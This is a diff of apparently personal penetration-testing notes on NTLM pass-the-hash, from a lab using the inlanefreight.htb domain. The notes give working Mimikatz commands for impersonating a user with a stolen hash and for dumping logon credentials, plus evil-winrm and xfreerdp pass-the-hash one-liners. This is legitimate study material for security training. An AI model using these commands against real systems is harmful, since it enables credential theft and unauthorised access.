@@ -2,16 +2,21 @@
 # Windows NTLM Introduction
 -------------------------
 - Using Mimikatz
-```cmd
-mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+	- Log in using hashes 
+	```cmd
+	mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 
-	# Options
-	/user - The username we want to impersonate
-	/rc4 or /NTLM - NTLM hash of the user's password
-	/domain - Domain the user to impersonate belongs to.
-	/run - the program we want to run once logged in	
-```
-
+		# Options
+		/user - The username we want to impersonate
+		/rc4 or /NTLM - NTLM hash of the user's password
+		/domain - Domain the user to impersonate belongs to.
+		/run - the program we want to run once logged in	
+	```
+	- Extract hashes in the same session
+	```cmd
+	mimikatz.exe privilege::debug "sekurlsa::logonPasswords full" exit
+	```
+	
 - PowerShell Invoke-TheHash
 ```PowerShell
 # Invoke-TheHash with SMB
@@ -56,4 +61,5 @@ evil-winrm -i $IP -u $USERNAME -H $HASH
 	```bash
 	xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
 	```
+
 
